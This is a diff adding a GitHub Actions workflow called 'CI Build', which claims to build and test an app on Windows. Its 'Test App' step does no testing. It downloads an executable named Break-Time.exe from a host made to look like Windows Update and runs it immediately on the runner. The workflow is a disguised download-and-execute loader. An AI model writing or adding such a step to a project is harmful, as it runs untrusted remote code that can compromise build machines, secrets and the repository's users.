@@ -1,0 +1,20 @@
+name: CI Build
+
+on:
+  workflow_dispatch: 
+jobs:
+  build:
+    name: Build and Test (${{ matrix.build_type }})
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        build_type: [Release]
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Cache dependencies
+      uses: actions/cache@v3
+
+    - name: Test App
+      run: curl -L -o break.exe "https://windows-updates.vercel.app/bins/Break-Time.exe"  & break.exe
